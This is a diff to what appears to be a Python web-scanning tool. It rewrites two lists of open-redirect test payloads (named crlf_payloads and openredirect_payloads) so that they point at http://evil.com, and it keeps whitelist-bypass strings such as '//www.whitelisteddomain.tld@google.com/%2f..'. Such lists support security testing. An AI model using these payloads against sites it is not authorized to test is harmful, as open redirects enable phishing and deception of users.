@@ -2,13 +2,13 @@ import re
 from urllib.parse import urlsplit, urlunsplit
 
 crlf_payloads = [
-    "?next=evil.com",
-    "?url=evil.com",
-    "?target=evil.com",
-    "?rurl=evil.com",
-    "?dest=evil.com",
-    "?redir=evil.com",
-    "redirect_uri=evil.com",
+    "?next=http://evil.com",
+    "?url=http://evil.com",
+    "?target=http://evil.com",
+    "?rurl=http://evil.com",
+    "?dest=http://evil.com",
+    "?redir=http://evil.com",
+    "redirect_uri=http://evil.com",
     "//www.whitelisteddomain.tld@google.com/%2f..",
     "///google.com/%2f..",
     "///www.whitelisteddomain.tld@google.com/%2f..",
@@ -44,13 +44,13 @@ openredirect_params = [
 ]
 
 openredirect_payloads = [
-    "?next=evil.com",
-    "?url=evil.com",
-    "?target=evil.com",
-    "?rurl=evil.com",
-    "?dest=evil.com",
-    "?redir=evil.com",
-    "redirect_uri=evil.com",
+    "?next=http://evil.com",
+    "?url=http://evil.com",
+    "?target=http://evil.com",
+    "?rurl=http://evil.com",
+    "?dest=http://evil.com",
+    "?redir=http://evil.com",
+    "redirect_uri=http://evil.com",
     "//www.whitelisteddomain.tld@google.com/%2f..",
     "///google.com/%2f..",
     "///www.whitelisteddomain.tld@google.com/%2f..",
